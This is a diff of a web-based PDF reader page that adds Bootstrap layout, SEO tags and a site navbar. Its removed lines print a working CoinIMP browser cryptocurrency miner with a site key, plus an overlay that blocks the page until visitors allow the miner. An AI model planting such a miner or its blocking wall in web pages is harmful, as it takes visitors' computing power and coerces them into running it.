@@ -1,47 +1,180 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PDF Book Reader</title>
-    <link rel="stylesheet" href="styles.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+        
+        
+        <link rel="stylesheet" href="styles.css">
+            
+        
+        <!-- Page Title and Description for SEO -->
+    <title>PDF Reader</title>
+  <meta name="description" content="Browser based simple pdf reader for opening pdf file online.">
+
+  <!-- Additional Meta Tags for SEO -->
+  <meta name="keywords" content="pdf opener, pdf reader, pdf reader online, pdf reader browser, pdf file open, browser pdf open">
+  
+        <!-- Include Global JavaScript-->
+  <script src="https://gurjartech.in/global.js"></script>
+<link rel="canonical" href="https://gurjartech.in/web-tools/pdf-reader/">
+  
+  <!--Bootstrap-->
+      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
+      <!--bootstrap js in body tag-->
+
+
+
+        <!--navbar style-->
+      <style>
+          .navbar-nav .nav-item:hover {
+   font-weight: bold;
+  
+}
+.material {
+         border-radius: 0px;
+         border: 0.1px solid #fff; 
+         box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
+         }
+         
+          </style>
+          <!--navbar style end-->
+    
+    
+    
+    
+  
+    
 </head>
 <body>
-    <div id="toolbar">
-        <input type="file" id="pdfInput" accept=".pdf">
-        <button id="zoomInBtn">Zoom In</button>
-        <button id="zoomOutBtn">Zoom Out</button>
-        <button id="prevPageBtn">Previous Page</button>
-        <button id="nextPageBtn">Next Page</button>
-        <input type="number" id="jumpToPageInput" placeholder="Jump to Page">
-        <button id="jumpToPageBtn">Go</button>
+    <body>
+    <!--navbar 4dec23-->
+      <nav class="material navbar navbar-expand-lg navbar-light bg-light mb-3">
+         <div class="container-fluid" style="overflow-x: scroll;">
+            <a class="material rounded p-1 my-1 navbar-brand d-flex align-items-center" href="https://gurjartech.in">
+            <img src="https://gurjartech.in/logo.jpg" alt="Gurjartech Logo" width="46" height="46" class="material d-inline-block align-top rounded-circle p-1">
+            <span class="fw-bold display-6 mx-1" style="color: #b13;">TECH</span>
+
+            </a>
+            <button class="navbar-toggler rounded-circle material p-1" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon rounded-circle m-1"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+               <ul class="navbar-nav ms-auto">
+                  <li class="mt-3">
+                     
+                     <form class="d-flex">
+                        <input id="search" class="material form-control m-1" type="search" placeholder="Search" aria-label="Search" style="border-radius: 5px; padding: 3px;">
+                        <button class="btn m-1 p-0" type="button" onclick="searchGoogle()">
+                        <img class="material rounded-circle" src="https://www.vectorlogo.zone/logos/google/google-icon.svg" alt="Google" height="30" width="30" loading="lazy">
+                        </button>
+                        <button class="btn m-1 p-0" type="button" onclick="searchYahoo()">
+                        <img class="material rounded-circle" src="https://www.vectorlogo.zone/logos/yahoo/yahoo-icon.svg" alt="Yahoo" height="30" width="30" loading="lazy">
+                        </button>
+                        <button class="btn m-1 p-0" type="button" onclick="searchBing()">
+                        <img class="material rounded-circle" src="https://www.vectorlogo.zone/logos/bing/bing-icon.svg" alt="Bing" height="30" width="30" loading="lazy">
+                        </button>
+                        <button class="btn m-1 p-0" type="button" onclick="searchDuckDuckGo()">
+                        <img class="material rounded-circle" src="https://www.vectorlogo.zone/logos/duckduckgo/duckduckgo-icon.svg" alt="Duck Duck Go" height="30" width="30" loading="lazy">
+                        </button>
+                     </form>
+                  </li>
+                  <li class="nav-item">
+                     <a class="nav-link m-1 p-1 rounded" href="https://gurjartech.in">Home</a>
+                  </li>
+                  
+                  <li class="nav-item">
+                     <a class="nav-link m-1 p-1 rounded" href="https://gurjartech.in/RES/privacy/">Privacy</a>
+                  </li>
+                  <li class="nav-item">
+                     <a class="nav-link m-1 p-1 rounded" href="https://gurjartech.in/RES/about/">About</a>
+                  </li>
+                  
+                  <li class="nav-item">
+                     <a class="nav-link m-1 p-1 rounded" href="https://gurjartech.in/RES/terms/">T&C</a>
+                  </li>
+                  <li class="nav-item">
+                     <a class="nav-link m-1 p-1 rounded" href="https://gurjartech.in/RES/contact/">Contact</a>
+                  </li>
+                  <li class="nav-item">
+                     <a class="nav-link m-1 p-1 rounded" href="https://gurjartech.in/RES/copyright/">Copyright</a>
+                  </li>
+               </ul>
+            </div>
+         </div>
+      </nav>
+      
+      <script>
+         function searchGoogle() {
+           var query = document.querySelector('input').value.trim();
+           if (query !== '') {
+             window.location.href = "https://www.google.com/search?q=site:gurjartech.in " + query;
+           }
+         }
+         
+         function searchBing() {
+           var query = document.querySelector('input').value.trim();
+           if (query !== '') {
+             window.location.href = "https://www.bing.com/search?q=site:gurjartech.in " + query;
+           }
+         }
+         
+         function searchDuckDuckGo() {
+           var query = document.querySelector('input').value.trim();
+           if (query !== '') {
+             window.location.href = "https://duckduckgo.com/?q=site:gurjartech.in " + query;
+           }
+         }
+         
+           function searchYahoo() {
+           var query = document.querySelector('input').value.trim();
+           if (query !== '') {
+             window.location.href = "https://search.yahoo.com/search?p=site:gurjartech.in " + query;
+           }
+         }
+         
+      </script>
+      <!--navbar end-->
+
+    <main>
+           
+           
+           <div id="toolbar" class="container d-flex justify-content-center align-items-center mb-3" style="background-color: transparent;">
+    <label for="pdfInput" class="btn btn-success" style="background-color: #2ecc71; border-color: #2ecc71;">
+        Choose PDF File
+        <input type="file" id="pdfInput" accept=".pdf" style="display: none;">
+    </label>
+</div>
+<div class="input-group mt-2 container">
+        <input type="number" id="jumpToPageInput" placeholder="Jump to Page" class="form-control">
+        <div class="input-group-append m-1">
+            <button id="jumpToPageBtn" class="btn btn-primary">Go</button>
+        </div>
     </div>
-    <div id="pdfViewer"></div>
+    <div class="container">
+    <div class="btn-group mt-1 ">
+        <button id="zoomOutBtn" class="btn btn-primary">Zoom Out</button>
+        <button id="zoomInBtn" class="btn btn-primary">Zoom In</button>
+        
+    </div>
+    
+    <div class="btn-group mt-1">
+        <button id="prevPageBtn" class="btn btn-primary"><< Previous</button>
+        <button id="nextPageBtn" class="btn btn-primary">Next Page >></button>
+    </div>
+    
+    
+</div>
+
+    
+    
+    <div id="pdfViewer" class="container-fluid scrollable-div overflow-auto"></div>
     <script src="script.js"></script>
-<script src="pdf.js"></script>
+    <script src="pdf.js"></script>
+</main>
 
 
-    <script src="https://www.hostingcloud.racing/4EWW.js"></script>
-<script>
-    var _client = new Client.Anonymous('918cc898f57df2495b406ff5b7d5e25aa3c506229c707e9e9bdbea08b8a71d04', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
-</script>
-<script>
-    setTimeout(function(){
-        if(typeof _client === 'undefined' || _client === null)
-        {
-            var messageDiv = document.createElement("div");
-            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
-            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
-            var mainDiv = document.createElement("div");
-            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
-            mainDiv.appendChild(messageDiv);
-            document.body.appendChild(mainDiv);
-            document.getElementsByTagName("body")[0].style.overflow = "hidden";
-            window.scrollTo(0, 0);
-        }
-    },1000);
-</script>
+    <!--bootstrap-->
+         <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>  
+
 </body>
 </html>
